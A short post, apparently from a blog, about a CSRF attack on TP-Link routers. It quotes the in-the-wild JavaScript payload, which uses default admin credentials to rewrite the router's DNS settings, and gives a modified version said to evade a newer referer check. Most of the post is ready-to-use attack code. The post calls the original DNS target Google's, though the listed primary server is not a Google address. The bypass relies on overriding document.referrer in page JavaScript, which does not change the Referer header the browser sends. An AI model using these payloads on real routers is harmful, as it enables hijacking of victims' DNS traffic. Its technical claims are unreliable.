In this [blog post](http://www.jakoblell.com/blog/2013/10/30/real-world-csrf-attack-hijacks-dns-server-configuration-of-tp-link-routers-2/), Jakob Lell writes about an attack on tp-link browsers his honeypots picked up on where a CSRF attack is made against TP-Link routers.

In the attack, the attacker uploads javascript to a site that the target visits, which when visited triggers the csrf attack.

The attack code looked like this (wherein the attack changes the DNS settings on the server to point to Google's DNS)

```
document.writeln('<style type="text/css">@import url(http://admin:admin@192.168.1.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&ip1=192.168.1.100&ip2=192.168.1.199&Lease=120&gateway=0.0.0.0&domain=&dnsserver=106.187.36.85&dnsserver2=8.8.8.8&Save=%B1%A3+%B4%E6);</style>')
```

On a new version of TP-Link, I found they added a server-side protection that checks the referer header (in addition to changing the ip to 192.168.0.1). This can be trivially bypassed in javascript by modifying the attack to look like so:

```
Object.defineProperty(document, "referrer", {get : function(){ return "http://192.168.0.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&ip1=192.168.0.100&ip2=192.168.0.199&Lease=120&gateway=0.0.0.0&domain=&dnsserver=8.8.4.4&dnsserver2=8.8.8.8&Save=Save"; }});

document.writeln('<style type="text/css">@import url(http://admin:admin@192.168.0.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&ip1=192.168.0.100&ip2=192.168.0.199&Lease=120&gateway=0.0.0.0&domain=&dnsserver=8.8.4.4&dnsserver2=8.8.8.8&Save=Save);</style>');
```

Wherein we first set the referrer to an acceptable string, then trigger the attack (with the ip updated).

